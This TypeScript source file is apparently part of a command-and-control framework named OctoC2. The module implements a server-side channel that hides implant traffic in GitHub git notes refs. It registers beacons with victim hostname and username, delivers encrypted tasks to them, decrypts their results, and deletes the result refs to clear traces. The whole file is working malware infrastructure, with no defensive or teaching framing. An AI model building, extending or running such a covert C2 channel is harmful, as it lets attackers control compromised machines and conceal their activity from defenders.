/**
 * OctoC2 Server — NotesChannel
 *
 * Polls git notes refs every pollIntervalMs:
 *   refs/notes/svc-a-{id8}  ACK / registration — beacon → server
 *   refs/notes/svc-r-{id8}  Task result        — beacon → server
 *
 * Delivers tasks to notes-registered beacons via:
 *   refs/notes/svc-t-{id8}  Task delivery      — server → beacon
 *
 * Crypto:
 *   Incoming results (beacon → server): crypto_box_seal — openSealBox()
 *   Outgoing tasks   (server → beacon): crypto_box      — encryptForBeacon()
 */

import type { Octokit } from "@octokit/rest";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import {
  openSealBox, encryptForBeacon,
  base64ToBytes, bytesToBase64,
} from "../crypto/sodium.ts";
import { createRequire } from "node:module";
import type _SodiumModule from "libsodium-wrappers";

const _sodium = createRequire(import.meta.url)("libsodium-wrappers") as typeof _SodiumModule;

interface NotesChannelOpts {
  owner:             string;
  repo:              string;
  token:             string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs:    number;
  octokit:           Octokit;
}

interface AckPayload {
  beaconId:  string;
  publicKey: string;
  hostname:  string;
  username:  string;
  os:        string;
  arch:      string;
  checkinAt: string;
}

interface ResultPayload {
  taskId:      string;
  beaconId:    string;
  success:     boolean;
  output:      string;
  completedAt: string;
}

export class NotesChannel {
  private timer: ReturnType<typeof setInterval> | null = null;

  /** beaconIds that registered via ACK refs (notes-channel beacons) */
  private readonly notesBeacons = new Set<string>();

  /** Last-seen SHA per ACK ref (to detect updates) */
  private readonly ackShas = new Map<string, string>();

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue:    TaskQueue,
    private readonly opts:     NotesChannelOpts,
  ) {}

  start(): void {
    if (this.timer) return;
    this.timer = setInterval(() => {
      this.poll().catch(err =>
        console.error("[NotesChannel] Poll error:", (err as Error).message)
      );
    }, this.opts.pollIntervalMs);
    console.log("[NotesChannel] Started polling");
  }

  stop(): void {
    if (this.timer) {
      clearInterval(this.timer);
      this.timer = null;
      console.log("[NotesChannel] Stopped");
    }
  }

  // ── Poll cycle ───────────────────────────────────────────────────────────────

  private async poll(): Promise<void> {
    const { owner, repo } = this.opts;

    await this.processAckRefs(owner, repo);
    await this.processResultRefs(owner, repo);
    await this.deliverPendingTasks(owner, repo);
  }

  // ── ACK ref processing ───────────────────────────────────────────────────────

  private async processAckRefs(owner: string, repo: string): Promise<void> {
    const refs = await this.opts.octokit.rest.git.listMatchingRefs({
      owner, repo, ref: "notes/svc-a-",
    });

    for (const ref of refs.data) {
      const sha = ref.object.sha;
      if (this.ackShas.get(ref.ref) === sha) continue;
      this.ackShas.set(ref.ref, sha);

      try {
        const blobResp = await this.opts.octokit.rest.git.getBlob({
          owner, repo, file_sha: sha,
        });
        const raw = blobResp.data.encoding === "base64"
          ? atob(blobResp.data.content.replace(/\n/g, ""))
          : blobResp.data.content;

        const ack = JSON.parse(raw) as AckPayload;
        if (!ack.beaconId || !ack.publicKey) continue;

        this.registry.register({
          beaconId:    ack.beaconId,
          issueNumber: 0,   // notes-channel beacons have no issue
          publicKey:   ack.publicKey,
          hostname:    ack.hostname,
          username:    ack.username,
          os:          ack.os,
          arch:        ack.arch,
          seq:         0,
        });
        this.notesBeacons.add(ack.beaconId);

        console.log(`[NotesChannel] Registered beacon ${ack.beaconId} from ACK ref`);
      } catch (err) {
        console.warn("[NotesChannel] ACK processing error:", (err as Error).message);
      }
    }
  }

  // ── Result ref processing ─────────────────────────────────────────────────────

  private async processResultRefs(owner: string, repo: string): Promise<void> {
    const refs = await this.opts.octokit.rest.git.listMatchingRefs({
      owner, repo, ref: "notes/svc-r-",
    });

    for (const ref of refs.data) {
      try {
        const blobResp = await this.opts.octokit.rest.git.getBlob({
          owner, repo, file_sha: ref.object.sha,
        });
        const sealed = blobResp.data.encoding === "base64"
          ? atob(blobResp.data.content.replace(/\n/g, "")).trim()
          : blobResp.data.content.trim();

        if (!sealed) continue;

        // Derive operator public key from secret key
        await _sodium.ready;
        const operatorPublicKey = _sodium.crypto_scalarmult_base(this.opts.operatorSecretKey);

        const plainBytes = await openSealBox(sealed, operatorPublicKey, this.opts.operatorSecretKey);
        const plain = new TextDecoder().decode(plainBytes);
        const result = JSON.parse(plain) as ResultPayload;

        if (result.taskId) {
          this.queue.markCompleted(result.taskId, plain);
          console.log(`[NotesChannel] Task ${result.taskId} completed (success=${result.success})`);
        }

        // Clear the result ref
        const refShort = ref.ref.replace("refs/", "");
        await this.opts.octokit.rest.git.deleteRef({ owner, repo, ref: refShort });
      } catch (err) {
        console.warn("[NotesChannel] Result processing error:", (err as Error).message);
      }
    }
  }

  // ── Task delivery ─────────────────────────────────────────────────────────────

  private async deliverPendingTasks(owner: string, repo: string): Promise<void> {
    for (const beaconId of this.notesBeacons) {
      const allPending = this.queue.getPendingTasks(beaconId);
      const pending = allPending.filter(
        t => !t.preferredChannel || t.preferredChannel === "notes"
      );
      if (pending.length === 0) continue;

      const beacon = this.registry.get(beaconId);
      if (!beacon) continue;

      try {
        const beaconPublicKey = await base64ToBytes(beacon.publicKey);
        const taskJson = JSON.stringify(pending.map(t => ({
          taskId: t.taskId,
          kind:   t.kind,
          args:   t.args,
          ref:    t.ref,
        })));

        const encrypted = await encryptForBeacon(
          taskJson,
          beaconPublicKey,
          this.opts.operatorSecretKey,
        );

        const blob = await this.opts.octokit.rest.git.createBlob({
          owner, repo,
          content:  JSON.stringify(encrypted),
          encoding: "utf-8",
        });

        const refShort = `notes/svc-t-${beaconId.slice(0, 8)}`;
        const refFull  = `refs/notes/svc-t-${beaconId.slice(0, 8)}`;

        try {
          await this.opts.octokit.rest.git.updateRef({
            owner, repo, ref: refShort, sha: blob.data.sha, force: true,
          });
        } catch (err: any) {
          if (err?.status === 422 || err?.status === 404) {
            await this.opts.octokit.rest.git.createRef({
              owner, repo, ref: refFull, sha: blob.data.sha,
            });
          } else {
            throw err;
          }
        }

        // Mark tasks as delivered
        for (const t of pending) {
          this.queue.markDelivered(t.taskId);
        }

        console.log(`[NotesChannel] Delivered ${pending.length} task(s) to beacon ${beaconId}`);
      } catch (err) {
        console.warn(`[NotesChannel] Task delivery error for ${beaconId}:`, (err as Error).message);
      }
    }
  }
}
